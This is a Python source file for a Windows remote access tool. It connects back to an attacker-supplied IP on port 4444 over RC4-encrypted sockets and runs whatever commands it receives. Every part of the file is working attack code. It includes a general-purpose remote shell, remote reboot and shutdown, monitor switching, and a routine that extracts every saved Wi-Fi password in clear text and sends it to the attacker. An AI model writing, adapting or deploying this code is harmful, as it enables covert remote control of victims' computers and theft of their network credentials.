import socket, os, subprocess, RC4Encryption, ctypes, winreg, win32api, win32con, datetime, requests
key = b'key' #change to something more secure
rc4 = RC4Encryption.RC4Encryption(key)
rc4.make_key()
rhost = '192.168.1.198' #change to the attacker's ip
rport = 4444 #change to whatever port you are using
buffer = 131072
separator = "<sep>"
s = socket.socket()
s.connect((rhost, rport))
cwd = os.getcwd()
s.send(rc4.crypt(cwd.encode()))
while True:
    cmd = rc4.crypt(s.recv(buffer)).decode()
    if cmd.lower() == 'isadmin':
        try:
            answer = os.getuid() == 0
        except AttributeError:
            answer = ctypes.windll.shell32.IsUserAnAdmin() != 0
        out = str(answer)
    elif cmd.lower() == 'getbrowser':
        path = r'Software\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
        out = winreg.QueryValueEx(key, 'ProgId')[0] + '\n'
    elif cmd.lower() == 'monoff':
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
        out = ''
    elif cmd.lower() == 'monon':
        ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
        win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, 0, 0)
        out = ''
    elif cmd.lower() == 'reboot':
        os.system('reboot now')
    elif cmd.split()[0].lower() == 'cd':
        if len(cmd.split()) == 2:
            if cmd.split()[1] == "..":
                os.chdir('\\'.join(os.getcwd().split('\\')[0:-1]))
                cwd = os.getcwd()
                out = ''
            else:
                try:
                    os.chdir(' '.join(cmd.split()[1:]))
                    cwd = os.getcwd()
                    out = ''
                except FileNotFoundError:
                    out = 'The system cannot find the path specified.'
        else:
            out = ''
    elif cmd.lower() == 'netprofiles':
        current = subprocess.getoutput('netsh wlan show interface').split('Profile')[1].split(': ')[1].split('\n')[0][0:-1]
        profiles = [i.split(' : ')[1] for i in subprocess.getoutput('netsh wlan show profiles').split('\n') if ': ' in i]
        profiles[profiles.index(current)] = current + ' (current)'
        wifi_info = {}
        for i in profiles:
            wifi_info[i] = ''
        for i in wifi_info:
            try:
                password = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i)).split('Security settings')[1].split('Cost settings')[0].split('Key Content            : ')[1].split('\n')[0]
                wifi_info[i] = password
            except IndexError:
                try:
                    wifi_info[i] = wifi_info[i] = subprocess.getoutput('netsh wlan show profiles "{}" key=clear'.format(i.split(' (current)')[0])).split('Profile')[3].split('Key Content')[1].split(': ')[1].split('\n')[0]
                except IndexError:
                    wifi_info[i] = 'N/A'
        final_info = [i + ': ' + wifi_info[i] for i in wifi_info]
        out = '\n'.join(final_info) + '\n'
    elif cmd.lower() == 'time': 
        out = datetime.datetime.now()
    elif cmd.lower() == 'shutdown':
        os.system('shutdown /s')
    elif cmd.lower() == 'ip':
        out = requests.get('http://wtfismyip.com/text').text
    else:
        out = subprocess.getoutput(cmd)
    cwd = os.getcwd()  
    message = f"{out}{separator}{cwd}"  
    s.send(rc4.crypt(message.encode()))
s.close()
